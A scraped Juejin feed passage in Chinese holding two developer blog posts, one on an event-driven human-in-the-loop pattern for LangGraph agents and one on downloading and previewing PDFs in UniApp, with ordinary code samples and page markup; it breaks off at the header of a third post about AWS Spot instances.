.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>前言</strong>：Human-in-the-Loop (人机协同) 是 Agent 从 Demo 走向落地的关键功能。但官方文档里的 <code>interrupt_before</code> 真的能直接用在生产环境吗？
本文将分享一种 <strong>Event-Driven（事件驱动）</strong> 的 HITL 设计模式，让你的 Agent 能够像后端服务一样，与前端 UI 完美配合。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">1. 原生 HITL 的困境：Static vs Dynamic</h2>
<p>⚠️ <strong>避坑指南</strong>：有些读者可能会搜到 <code>langchain.agents.middleware.HumanInTheLoopMiddleware</code> 这个类。
<strong>疑问</strong>：<em>“这个 Middleware 看起来用法很简单，为什么我们还要用更复杂的 LangGraph 架构？”</em>
<strong>真相</strong>：</p>
<ol>
<li><strong>架构代差</strong>：<code>HumanInTheLoopMiddleware</code> 是为上一代 <strong>AgentExecutor</strong>（循环链）设计的，不适用于最新的 <strong>LangGraph</strong> 架构。它的“暂停”往往基于内存中的回调，一旦服务重启，等待审批的上下文可能就丢失了。</li>
<li><strong>生产级能力</strong>：<strong>LangGraph</strong> 是基于 <strong>状态机（State Machine）</strong> 的。它的 HITL 能力（如 <code>checkpointer</code>）通过数据库持久化了每一次状态变更。这意味着你可以今天暂停 Agent，下周一再恢复它，或者在中断期间修改它的记忆（Time Travel）。这是 Middleware 很难做到的。</li>
</ol>
<p>因此，虽然 LangGraph 写起来代码多一点，但它带来的<strong>鲁棒性</strong>是生产环境必须的。</p>
<p>对于 LangGraph，常用的做法是 <code>interrupt_before</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Static Interrupt (静态中断)</span>
app = workflow.<span class="hljs-built_in">compile</span>(
    checkpointer=memory,
    interrupt_before=[<span class="hljs-string">"action_node"</span>]
)
</code></pre>
<p>但这在实际落地时会遇到“上下文丢失”的问题：<strong>前端如何知道为什么要中断？中断时携带的数据（Payload）在哪里？</strong>
单纯的 <code>interrupt_before</code> 只是让图停下来，并没有告诉外部世界“发生了什么”。虽然 LangGraph 后来推出了 <code>interrupt()</code> 函数（Dynamic Interrupt）来尝试解决这个问题，但在复杂的企业级业务中，我们依然面临挑战：</p>
<ul>
<li><strong>数据持久化</strong>：<code>interrupt()</code> 的 payload 是运行时状态。如果我不小心重启了服务器，或者我想仅仅通过查询数据库（而不运行 Graph）来获取“当前有哪些待审批任务”，运行时中断信息就很难获取了。</li>
<li><strong>领域模型耦合</strong>：审批流往往是业务逻辑的一部分，应该存储在 <code>AgentState</code>（领域模型）中，而不是隐藏在 Graph 的运行时的堆栈里。</li>
</ul>
<p>因此，我们提出了一种 <strong>基于 State 的事件驱动模式</strong>。</p>
<h2 data-id="heading-1">2. 破局：事件驱动模式 (Event-Driven HITL)</h2>
<p>为了解决这个问题，我们在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchangflow%2Fdeep-research-agent" target="_blank" title="https://github.com/changflow/deep-research-agent" ref="nofollow noopener noreferrer">Deep Research Agent</a> 项目中，设计了一套 <strong>基于事件</strong> 的 HITL 机制。</p>
<h3 data-id="heading-2">2.1 在 State 中显式定义“暂停事件”</h3>
<p>我们不让 Graph 莫名其妙地停，而是先往 State 里写一张“请假条”：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># src/deep_research_agent/core/state.py</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HITLEvent</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    event_type: <span class="hljs-built_in">str</span>        <span class="hljs-comment"># 事件类型，如 "approve_plan"</span>
    payload: <span class="hljs-type">Dict</span>          <span class="hljs-comment"># 携带的数据，如生成的 Plan 内容</span>
    requires_response: <span class="hljs-built_in">bool</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-comment"># ...其他字段</span>
    pending_hitl_event: <span class="hljs-type">Optional</span>[HITLEvent]  <span class="hljs-comment"># 👈 关键字段：当前的挂起事件</span>
</code></pre>
<h3 data-id="heading-3">2.2 使用“审批节点”代替直接中断</h3>
<p>我们不直接在 <code>search_node</code> 前中断，而是插入一个专门的 <code>create_approval</code> 节点：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># src/deep_research_agent/graph.py</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_plan_approval_node</span>(<span class="hljs-params">state: AgentState</span>):
    <span class="hljs-comment"># 1. 创建事件</span>
    event = {
        <span class="hljs-string">"event_type"</span>: <span class="hljs-string">"plan_approval"</span>,
        <span class="hljs-string">"payload"</span>: {<span class="hljs-string">"plan"</span>: state[<span class="hljs-string">"plan"</span>]},
        <span class="hljs-string">"requires_response"</span>: <span class="hljs-literal">True</span>
    }
    
    <span class="hljs-comment"># 2. 更新状态，前端此时能看到这个 event</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"pending_hitl_event"</span>: event}

<span class="hljs-comment"># 在图里连接： plan -&gt; create_approval -&gt; wait_node</span>
workflow.add_node(<span class="hljs-string">"create_plan_approval"</span>, create_plan_approval_node)
workflow.add_edge(<span class="hljs-string">"plan_node"</span>, <span class="hljs-string">"create_plan_approval"</span>)
</code></pre>
<h3 data-id="heading-4">2.3 前端的完美配合</h3>
<p>现在，前端（React/Vue）的逻辑变得极其清晰：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 前端伪代码</span>
<span class="hljs-keyword">const</span> { state } = <span class="hljs-title function_">useAgentStream</span>();

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> event = state.<span class="hljs-property">pending_hitl_event</span>;
  
  <span class="hljs-keyword">if</span> (event &amp;&amp; event.<span class="hljs-property">requires_response</span>) {
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">event_type</span> === <span class="hljs-string">'plan_approval'</span>) {
      <span class="hljs-comment">// 💡 自动弹出“计划确认”模态框</span>
      <span class="hljs-title function_">showModal</span>(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">PlanApprovalModal</span> <span class="hljs-attr">plan</span>=<span class="hljs-string">{event.payload.plan}</span> /&gt;</span></span>);
    }
  }
}, [state]);
</code></pre>
<p>看！<strong>后端的状态驱动了前端的 UI。</strong> 这才是现代 Web 应用该有的样子。</p>
<h2 data-id="heading-5">3. 为什么这很重要？</h2>
<ol>
<li><strong>解耦</strong>：Graph 只需要负责产生事件，不需要关心前端怎么画 UI。</li>
<li><strong>可观测性</strong>：在数据库或日志里，我们可以清楚地看到 Agent 在哪一刻生成了审批请求，以及用户何时给出了反馈。</li>
<li><strong>灵活性</strong>：你可以在 <code>payload</code> 里塞入任何东西，比如推荐的搜索关键词、风险提示、置信度分数等，辅助人类做决策。</li>
</ol>
<h2 data-id="heading-6">4. 源码与实战</h2>
<p>这套机制的完整 Python 实现（包括 <code>HITLManager</code> 类和 <code>Graph</code> 编排）都已经开源。
如果你正在为“Agent 怎么和前端交互”发愁，这绝对是你的解药。</p>
<p>👉 <strong>GitHub 项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchangflow%2Fdeep-research-agent" target="_blank" title="https://github.com/changflow/deep-research-agent" ref="nofollow noopener noreferrer">github.com/changflow/d…</a></p>
<hr/>
<p><em>虽然这种写法比原生的 <code>interrupt</code> 多写了几十行代码，但它换来的是一个健壮、可维护的生产级系统。工程化的魅力，往往就藏在这些“多出来”的代码里。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp PDF文件下载与预览功能完整实现指南]]></title>    <link>https://juejin.cn/post/7577050643202850866</link>    <guid>https://juejin.cn/post/7577050643202850866</guid>    <pubDate>2025-11-27T07:49:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577050643202850866" data-draft-id="7576978338755280946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp PDF文件下载与预览功能完整实现指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-27T07:49:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyberShen"/> <meta itemprop="url" content="https://juejin.cn/user/554609587530014"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp PDF文件下载与预览功能完整实现指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/554609587530014/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyberShen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:49:21.000Z" title="Thu Nov 27 2025 07:49:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">功能概述</h2>
<p>在UniApp开发中，实现PDF文件的下载与预览是一项常见需求。本文将详细介绍如何使用UniApp框架实现这一功能，并提供完整的代码示例和注意事项。以下是完整的实现代码，支持多端兼容和错误处理：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">handleDownload</span> = (item: any) =&gt; {
  uni.<span class="hljs-title function_ invoke__">showLoading</span>({<span class="hljs-attr">title</span>:<span class="hljs-string">'下载中...'</span>})
  <span class="hljs-comment">// 定义存储路径</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">filePath</span> = `${uni.env.USER_DATA_PATH}/${item.name}.pdf`
  uni.<span class="hljs-title function_ invoke__">downloadFile</span>({
    <span class="hljs-attr">url</span>: item.fileUrl,
    <span class="hljs-attr">success</span>: (<span class="hljs-attr">data</span>:any) =&gt; {
      uni.<span class="hljs-title function_ invoke__">getFileSystemManager</span>().<span class="hljs-title function_ invoke__">saveFile</span>({
        <span class="hljs-attr">tempFilePath</span>: data.tempFilePath,
        <span class="hljs-attr">filePath</span>: filePath, // 目标路径（可选）
        <span class="hljs-attr">success</span>: (<span class="hljs-attr">res1</span>:any) =&gt; {
          uni.<span class="hljs-title function_ invoke__">openDocument</span>({
            <span class="hljs-attr">filePath</span>: res1.savedFilePath,
            <span class="hljs-attr">fileType</span>: <span class="hljs-string">'pdf'</span>,
            <span class="hljs-attr">showMenu</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">fail</span>: () =&gt; {
              uni.<span class="hljs-title function_ invoke__">showToast</span>({<span class="hljs-attr">icon</span>:<span class="hljs-string">'none'</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">'打开失败'</span>})
            },
          });
        },
        fail: err =&gt; {
          uni.<span class="hljs-title function_ invoke__">showToast</span>({<span class="hljs-attr">icon</span>:<span class="hljs-string">'none'</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">'保存失败'</span>})
        }
      })
    },
    fail: (err) =&gt; {
      console.<span class="hljs-title function_ invoke__">log</span>(err);
      uni.<span class="hljs-title function_ invoke__">showToast</span>({
        <span class="hljs-attr">icon</span>: <span class="hljs-string">'none'</span>,
        <span class="hljs-attr">mask</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">title</span>: <span class="hljs-string">'失败请重新下载'</span>,
      });
    },
    complete: () =&gt; {
      uni.<span class="hljs-title function_ invoke__">hideLoading</span>()
    },
  })
}
</code></pre>
<h2 data-id="heading-1">实现原理分析</h2>
<h3 data-id="heading-2">1. 下载流程</h3>
<p>UniApp提供了<code>uni.downloadFile</code>API用于文件下载，此方法会将远程文件下载到临时路径。下载成功后，通过<code>uni.getFileSystemManager().saveFile()</code>将文件从临时路径保存到指定位置，使其持久化存储。</p>
<h3 data-id="heading-3">2. 预览功能</h3>
<p>保存成功后，使用<code>uni.openDocument</code>API打开PDF文件。该API会自动调用系统中已安装的PDF阅读器来打开文件，提供良好的用户体验。</p>
<h2 data-id="heading-4">多端兼容性处理</h2>
<h3 data-id="heading-5">不同平台的实现差异</h3>
<p>根据目标平台的不同，可能需要采用不同的实现方案：</p>
<ol>
<li><strong>H5平台</strong>：可以使用<code>window.open</code>直接在新标签页打开PDF链接</li>
<li><strong>微信小程序</strong>：需在微信公众平台配置<code>downloadFile</code>合法域名</li>
<li><strong>APP端</strong>：可使用上述代码实现，也可集成原生PDF插件获得更好体验</li>
</ol>
<h3 data-id="heading-6">多端兼容代码示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">exportPDF</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// #ifdef H5</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(pdfUrl)
  <span class="hljs-comment">// #endif</span>
  
  <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
  uni.<span class="hljs-title function_">downloadFile</span>({
    <span class="hljs-attr">url</span>: pdfUrl,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">statusCode</span> === <span class="hljs-number">200</span>) {
        uni.<span class="hljs-title function_">openDocument</span>({
          <span class="hljs-attr">filePath</span>: res.<span class="hljs-property">tempFilePath</span>,
          <span class="hljs-attr">showMenu</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">file</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"文件打开成功"</span>)
          }
        })
      }
    }
  })
  <span class="hljs-comment">// #endif</span>
  
  <span class="hljs-comment">// #ifdef APP-PLUS</span>
  <span class="hljs-comment">// 使用前面提供的handleDownload方法</span>
  <span class="hljs-comment">// #endif</span>
}
</code></pre>
<h2 data-id="heading-7">优化与扩展功能</h2>
<h3 data-id="heading-8">1. 自定义保存路径</h3>
<p>默认情况下，文件保存在应用沙盒目录内。如需保存到用户自定义目录（如手机存储的特定文件夹），可以使用以下方法：</p>
<pre><code class="hljs language-ini" lang="ini">// Android平台保存到自定义目录
const <span class="hljs-attr">downLoadFile</span> = (file) =&gt; {
  let <span class="hljs-attr">dtask</span> = plus.downloader.createDownload(file.fileUrl, {
    filename: "file://storage/emulated/0/自定义文件夹/" + file.originalName
  }, function(d, status) {
    if (<span class="hljs-attr">status</span> == <span class="hljs-number">200</span>) {
      let <span class="hljs-attr">fileSaveUrl</span> = plus.io.convertLocalFileSystemURL(d.filename)
      plus.runtime.openFile(d.filename)
    }
  })
  dtask.start()
}
</code></pre>
<h3 data-id="heading-9">2. 下载进度显示</h3>
<p>可以添加进度监听，提升用户体验：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> downloadTask = uni.<span class="hljs-title function_">downloadFile</span>({
  <span class="hljs-attr">url</span>: item.<span class="hljs-property">fileUrl</span>,
  <span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-comment">// 成功处理</span>
  }
})

downloadTask.<span class="hljs-title function_">onProgressUpdate</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'下载进度'</span> + res.<span class="hljs-property">progress</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'已下载'</span> + res.<span class="hljs-property">totalBytesWritten</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'总大小'</span> + res.<span class="hljs-property">totalBytesExpectedToWrite</span>)
})
</code></pre>
<h3 data-id="heading-10">3. 使用PDF.js实现内嵌预览</h3>
<p>对于需要应用内预览的场景，可以集成PDF.js：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">web-view</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"webViewUrl"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">pdfUrl</span>: <span class="hljs-string">''</span>,
      <span class="hljs-attr">webViewUrl</span>: <span class="hljs-string">''</span>
    }
  },
  <span class="hljs-title function_">onLoad</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pdfUrl</span> = options.<span class="hljs-property">url</span>
    <span class="hljs-comment">// 使用PDF.js的viewer.html预览</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webViewUrl</span> = <span class="hljs-string">`/static/pdfjs/web/viewer.html?file=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">this</span>.pdfUrl)}</span>`</span>
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-11">常见问题与解决方案</h2>
<h3 data-id="heading-12">1. 文件打开失败</h3>
<ul>
<li><strong>原因</strong>：设备上没有安装PDF阅读器</li>
<li><strong>解决方案</strong>：提示用户安装相关应用，或使用PDF.js等在线预览方案</li>
</ul>
<h3 data-id="heading-13">2. 下载权限问题</h3>
<ul>
<li><strong>Android平台</strong>：需要申请存储权限</li>
</ul>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 申请存储权限</span>
plus.android.<span class="hljs-built_in">requestPermissions</span>([
  <span class="hljs-string">'android.permission.WRITE_EXTERNAL_STORAGE'</span>,
  <span class="hljs-string">'android.permission.READ_EXTERNAL_STORAGE'</span>
], successCallback, errorCallback)
</code></pre>
<h3 data-id="heading-14">3. 域名白名单限制</h3>
<ul>
<li><strong>微信小程序</strong>：需在微信公众平台配置downloadFile合法域名</li>
</ul>
<h3 data-id="heading-15">4. 二进制流文件处理</h3>
<p>如果后端返回的是文件流而非直接链接，需要特殊处理：</p>
<pre><code class="hljs language-javascript" lang="javascript">uni.<span class="hljs-title function_">request</span>({
  <span class="hljs-attr">url</span>: fileUrl,
  <span class="hljs-attr">responseType</span>: <span class="hljs-string">'arraybuffer'</span>,
  <span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([response.<span class="hljs-property">data</span>], {<span class="hljs-attr">type</span>: <span class="hljs-string">'application/pdf;charset=UTF-8'</span>})
    <span class="hljs-keyword">let</span> pdfUrl = <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob)
    <span class="hljs-comment">// 使用此URL进行预览或下载</span>
  }
})
</code></pre>
<h2 data-id="heading-16">总结</h2>
<p>本文详细介绍了在UniApp中实现PDF文件下载与预览的完整方案。核心代码使用了<code>uni.downloadFile</code>和<code>uni.openDocument</code>API，具有良好的跨平台兼容性。针对不同平台和特殊需求，也提供了相应的优化方案和扩展功能。关键点总结：</p>
<ol>
<li><strong>核心流程</strong>：下载→保存→预览</li>
<li><strong>多端兼容</strong>：通过条件编译实现各平台最佳体验</li>
<li><strong>用户体验</strong>：添加进度提示和错误处理</li>
<li><strong>灵活扩展</strong>：支持自定义路径和内嵌预览等功能</li>
</ol>
<p>此方案已在多个项目中实践验证，稳定可靠，可以作为UniApp项目文件处理的基础实现。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[亚马逊云渠道商：怎么使用Spot实例实现成本降低70%？]]></title>    <link>https://juejin.cn/post/7577050643202867250</link>    <guid>https://juejin.cn/post/7577050643202867250</guid>    <pubDate>2025-11-27T07:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577050643202867250" data-draft-id="7576978338755149874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="亚马逊云渠道商：怎么使用Spot实例实现成本降低70%？"/> <meta itemprop="keywords" content="架构,运维"/> <meta itemprop="datePublished" content="2025-11-27T07:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云渠道商yunshuguoji"/> <meta itemprop="url" content="https://juejin.cn/user/3854235718130362"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            亚马逊云渠道商：怎么使用Spot实例实现成本降低70%？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3854235718130362/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云渠道商yunshuguoji
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:51:44.000Z" title="Thu Nov 27 2025 07:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
